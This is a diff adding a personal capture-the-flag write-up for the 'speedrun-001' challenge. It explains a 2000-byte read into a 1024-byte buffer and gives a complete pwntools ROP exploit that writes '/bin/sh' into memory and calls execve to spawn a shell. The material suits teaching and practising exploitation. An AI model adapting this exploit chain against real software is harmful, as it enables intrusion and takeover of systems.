@@ -1,0 +1,49 @@
+=== Personal solution description ===
+
+Binary is 64-bit, statically linked and stripped. However, using Ghidra we can find the main function by looking for user strings (such as "Any last words?"). We can see very easily that 2000 bytes of input are loaded into a 1024 bytes buffer. Since it's statically linked, we can look for gadgets using the ROPgadget tool and assemble an exploit, just like in bkp16_simplecalc. So, let's not delay and see the exploit:
+
+---------------------------------------------------------------------------------
+	#!/usr/bin/env python3
+	from pwn import *
+
+	# ROP gadgets
+	pop_rax = 0x415664        # pop rax; ret
+	pop_rsi = 0x4101f3        # pop rsi; ret
+	pop_rdi = 0x400686        # pop rdi; ret
+	pop_rdx = 0x4498b5        # pop rdx; ret
+	syscall_gadget = 0x40129c # syscall
+	mov_gadget = 0x48d251     # mov qword ptr [rax], rdx ; ret
+
+	data_region_addr = 0x6b90e0
+
+	target = process("./speedrun-001")
+	target.recvuntil(b"last words?")
+
+	# write /bin/sh in memory
+	payload = b""
+	payload += p64(pop_rax)
+	payload += p64(data_region_addr)
+	payload += p64(pop_rdx)
+	payload += b"/bin/sh\x00"
+	payload += p64(mov_gadget)
+
+	# do execve syscall
+	payload += p64(pop_rax)
+	payload += p64(0x3b)
+	payload += p64(pop_rdi)
+	payload += p64(data_region_addr)
+	payload += p64(pop_rsi)
+	payload += p64(0x0)
+	payload += p64(pop_rdx)
+	payload += p64(0x0)
+
+	payload += p64(syscall_gadget)
+
+	payload = b"A" * 1032 + payload
+
+	target.sendline(payload)
+
+	target.interactive()
+---------------------------------------------------------------------------------
+
+This is actually easier than simplecalc, because we can simply slap the addresses straight in the payload, instead of calling functions in the "calculator" app. Success on first try! :D
